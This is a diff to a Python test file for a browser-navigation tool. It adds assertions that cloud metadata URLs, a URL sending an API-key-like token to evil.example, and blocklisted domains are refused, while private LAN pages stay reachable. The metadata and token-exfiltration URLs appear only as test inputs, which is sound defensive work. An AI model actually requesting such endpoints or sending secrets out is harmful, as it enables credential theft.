@@ -176,19 +176,39 @@ class TestRealContextNavigateEndToEnd:
             assert ("https://example.com", True) in calls
 
     def test_metadata_refused_through_the_seam(self, camofox, real_ctx):
-        self._spy_seam(real_ctx)
+        calls = self._spy_seam(real_ctx)
         result = self._navigate("http://169.254.169.254/latest/meta-data/")
         assert result["success"] is False and "metadata" in result["error"]
         assert camofox.requests == []
+        if calls is not None:
+            assert ("http://169.254.169.254/latest/meta-data/", True) in calls
 
     def test_secret_in_url_refused_through_the_seam(self, camofox, real_ctx):
-        self._spy_seam(real_ctx)
+        calls = self._spy_seam(real_ctx)
         result = self._navigate("https://evil.example/?k=sk-proj-ABCD1234567890EFGHIJKL")
         assert result["success"] is False and "API key or token" in result["error"]
         assert camofox.requests == []
+        if calls is not None:
+            assert any(url.startswith("https://evil.example/") for url, _ in calls)
+
+    def test_blocklist_refused_through_the_seam(self, camofox, real_ctx, write_config, monkeypatch):
+        # The website_blocklist floor, reached through the ctx seam with a real context.
+        from tools import website_policy
+
+        monkeypatch.setattr(website_policy, "_cached_policy", None, raising=False)  # process-wide cache
+        write_config("security:\n  website_blocklist:\n    enabled: true\n    domains: [blocked.example]\n")
+        calls = self._spy_seam(real_ctx)
+        result = self._navigate("https://blocked.example/page")
+        assert result["success"] is False
+        assert result["blocked_by_policy"]["host"] == "blocked.example"
+        assert camofox.requests == []
+        if calls is not None:
+            assert ("https://blocked.example/page", True) in calls
 
     def test_private_lan_reachable_through_the_seam(self, camofox, real_ctx):
         # The reason the plugin passes auto_local=True: a LAN page is not refused, as in core's
         # own Camofox path. This is the security-sensitive behaviour, now asserted end to end.
-        self._spy_seam(real_ctx)
+        calls = self._spy_seam(real_ctx)
         assert self._navigate("http://192.168.1.20:8080/")["success"] is True
+        if calls is not None:
+            assert ("http://192.168.1.20:8080/", True) in calls
